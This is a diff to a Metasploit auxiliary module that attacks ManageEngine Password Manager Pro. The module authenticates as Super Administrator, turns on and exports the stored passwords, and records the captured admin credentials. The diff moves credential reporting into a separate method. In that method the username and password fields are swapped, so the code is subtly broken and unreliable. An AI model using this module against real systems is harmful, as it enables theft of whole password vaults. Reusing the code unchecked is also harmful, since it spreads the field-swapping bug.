@@ -239,6 +239,8 @@ class Metasploit3 < Msf::Auxiliary
 
     if cookie_su.nil?
       fail_with(Failure::NoAccess, "#{peer} - Failed to authenticate as Super Administrator, account #{username} might not work.")
+    else
+      report_super_admin_creds(username, password)
     end
 
     # 1st we turn on password exports
@@ -285,31 +287,34 @@ class Metasploit3 < Msf::Auxiliary
     else
       print_error("#{peer} - Failed to export Password Manager Pro passwords.")
     end
+  end
+
+  def report_super_admin_creds(username, password)
     status = Metasploit::Model::Login::Status::SUCCESSFUL
 
-
     service_data = {
-      address: rhost,
-      port: rport,
-      service_name: 'https',
-      protocol: 'tcp',
-      workspace_id: myworkspace_id
+        address: rhost,
+        port: rport,
+        service_name: 'https',
+        protocol: 'tcp',
+        workspace_id: myworkspace_id
     }
+
     credential_data = {
-      origin_type: :service,
-      module_fullname: self.fullname,
-      private_type: :password,
-      private_data: username,
-      username: password
+        origin_type: :service,
+        module_fullname: self.fullname,
+        private_type: :password,
+        private_data: username,
+        username: password
     }
 
     credential_data.merge!(service_data)
     credential_core = create_credential(credential_data)
     login_data = {
-      core: credential_core,
-      access_level: 'Super Administrator',
-      status: status,
-      last_attempted_at: DateTime.now
+        core: credential_core,
+        access_level: 'Super Administrator',
+        status: status,
+        last_attempted_at: DateTime.now
     }
     login_data.merge!(service_data)
     create_credential_login(login_data)
